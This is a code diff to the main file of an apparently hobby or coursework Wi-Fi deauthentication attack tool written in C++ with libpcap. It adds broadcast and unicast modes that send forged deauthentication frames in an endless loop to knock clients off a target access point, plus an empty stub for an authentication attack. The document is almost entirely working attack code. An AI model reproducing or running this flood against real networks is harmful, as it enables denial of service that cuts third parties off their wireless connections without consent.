@@ -4,6 +4,10 @@
 #include "DeauthAttack.h"
 
 
+int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator);
+int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr);
+
+
 int main(int argc, char* argv[])
 {
     Param param = {
@@ -25,24 +29,63 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    uint8_t ap_mac[6] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };
-    uint8_t st_mac[6] = { 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c };
-    DeauthAttack pkt_gen(ap_mac);
-    // DeauthAttack pkt_gen(ap_mac, st_mac);
+    int res = 0;
+    switch (argc)
+    {
+    case 3:
+    {
+        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_);
+        res = do_deauth_attack(handle, pkt_gen_deauth_broadcast);
+        if (res != 0)
+        {
+            return -1;
+        }
+        break;
+    }
+    case 4:
+    {
+        DeauthAttack* pkt_gen_deauth_unicast = new DeauthAttack(param.ap_mac_, param.st_mac_);
+        res = do_deauth_attack(handle, pkt_gen_deauth_unicast);
+        if (res != 0)
+        {
+            return -1;
+        }
+        break;
+    }
+    case 5:
+    {
+        res = do_auth_unicast(handle, param.ap_mac_, param.st_mac_);
+        if (res != 0)
+        {
+            return -1;
+        }
+        break;
+    }
+    default:
+        break;
+    }
+    
+	return 0;
+}
+
+
+int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator)
+{
+    wlan_deauth_pkt* attack_pkt = pkt_generator->get_pkt();
     while (true)
     {
-        sleep(0);
-        wlan_deauth_pkt* attack_pkt = pkt_gen.get_pkt();
         int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
             pcap_close(handle);
             return -1;
         }
-        dump((void*)attack_pkt->packet, attack_pkt->size);
-        printf("\n");
     }
-    
+    return 0;
+}
 
-	return 0;
+
+int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr)
+{
+    return 0;
 }
